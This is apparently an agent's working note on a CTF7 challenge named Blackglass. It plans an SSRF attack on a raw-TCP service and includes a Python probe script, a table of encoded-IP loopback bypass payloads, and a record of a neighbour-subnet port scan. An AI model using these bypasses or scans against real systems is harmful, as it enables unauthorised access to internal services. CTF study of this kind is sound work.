# Blackglass — CTF7 raw-TCP SSRF challenge (BI{...})

Challenge: Blackglass, CTF7 platform, 600 pts, Tag WEB, Difficulty Hard.
"Unusual requests have been observed within an Asterveil partner platform. Investigate
the application and determine what is behind the activity." Flag format `BI{...}`.

## Hints (from the challenge page)
- **Hint 1 (40 pts):** "URL validation and network connection libraries do not always
  interpret host representations identically." → classic SSRF filter bypass via host-encoding
  mismatch: the validation layer (e.g. a URL parser / allowlist) and the actual connection
  layer (socket / requests / raw connect) parse `127.0.0.1` differently. Bypass with
  decimal / hex / octal IPs.
- **Hint 2 (70 pts):** "Internal API documentation can reveal useful functionality, but some
  important routes may require further source inspection." → there is an internal docs surface
  (likely reachable once SSRF works), and the juicy route is NOT in the public docs — it needs
  source/route inspection (the flag route).

## Service character (recon finding)
- The Blackglass endpoint is **raw TCP, NOT HTTP**. `curl http://2.29.10.21:8082/` returns
  `000` (connection refused / no HTTP layer). The user noted "maybe it will not work on http
  it will work on nc" — i.e. connect with `nc` / a raw socket, speak a custom command protocol.
- Observed at `2.29.10.21:8082` (flapping — comes up and down; needs a poller, see below).
- This is the "Asterveil partner platform" — ties into the same ecosystem as the 8082/8083/8084
  Asterveil boxes. The SSRF likely lets you reach internal-only endpoints on those.

## Likely intended path
1. Connect via raw socket (nc/python). Discover the command protocol (banner, HELP, etc.).
2. Find the URL/host-fetch feature (the "unusual requests" = SSRF). It validates the host with
   one lib and connects with another.
3. Bypass the filter with an encoded IP (decimal `2139056642` = 127.0.0.1, hex `0x7f000001`,
   octal `0177.0.0.1`, short `127.1`, `0`). Reach internal endpoints / metadata.
4. Pull internal API docs. Find the hidden route (Hint 2) that returns `BI{...}`.

## Gentle flapping-target poller (honor "send few requests to avoid block")
When the port flaps, do NOT fuzz-bomb. Stand up a poller that:
- loops with a long gap (10s–120s) doing ONLY `socket.connect()` (no payload),
- on first successful connect sends a TINY set of probes, then STOPS:
  1. read banner (no input),
  2. one help/enum command (`HELP\r\n` / `DOC\r\n` / `INFO\r\n`),
  3. one encoded-IP SSRF probe (e.g. `FETCH http://2139056642/\r\n`).
- logs to a file and notifies on completion.

Minimal skeleton:
```python
import socket, time
HOST,PORT="2.29.10.21",8082
def recv_all(s,t=2.5):
    s.settimeout(t); d=b""
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            d+=c
    except socket.timeout: pass
    return d
for _ in range(60):                     # ~10 min, 10s gap
    s=socket.socket(); s.settimeout(3)
    try:
        s.connect((HOST,PORT)); break
    except Exception:
        s.close(); time.sleep(10)
else:
    print("never up"); raise SystemExit
b=recv_all(s,2.5); print("banner:",b[:400])
s.sendall(b"HELP\r\n"); print("HELP:",recv_all(s,2.5)[:400])
s.sendall(b"FETCH http://2139056642/\r\n"); print("SSRF:",recv_all(s,2.5)[:400])
s.close()
```

## SSRF host-encoding bypass table (for Hint 1)
| payload | resolves to |
|---|---|
| `http://2139056642/` | 127.0.0.1 (decimal) |
| `http://0x7f000001/` | 127.0.0.1 (hex) |
| `http://0177.0.0.1/` | 127.0.0.1 (octal) |
| `http://127.1/` | 127.0.0.1 (short) |
| `http://0/` | 0.0.0.0 |
| `http://[::ffff:127.0.0.1]/` | 127.0.0.1 (IPv4-mapped) |

Try these against the service's fetch command once the protocol is known. Decimal/hex/octal
survive a literal-string loopback filter (see hunt-ssrf "Verified filter-bypass ranking").

## Status at write-time
- `2.29.10.21:8082` was refusing during the session (flapping). A gentle 10-min poller ran and
  found it never came up; a one-shot neighbor scan (2.29.10.x / 2.29.23.x common ports) found
  everything closed. Re-poll when the user reports the box is back, using the skeleton above.
- No flag captured yet. Next action on target-up: run the 3 quiet probes, map the command set,
  locate the URL-fetch/SSRF feature, apply the encoded-IP bypass, hunt the hidden `BI{...}` route.

## Related
- `hunt-ssrf` SKILL.md → "Operator cadence on CTF challenges", "Verified filter-bypass ranking",
  "Subnet-discovery workflow (multi-service CTF boxes)".
- `references/blackglass-ctf7-chain.md` → a DIFFERENT Blackglass scenario (Flask LFI on 5004,
  BrokerLink JWT) — do not confuse; this file is the raw-TCP SSRF variant.
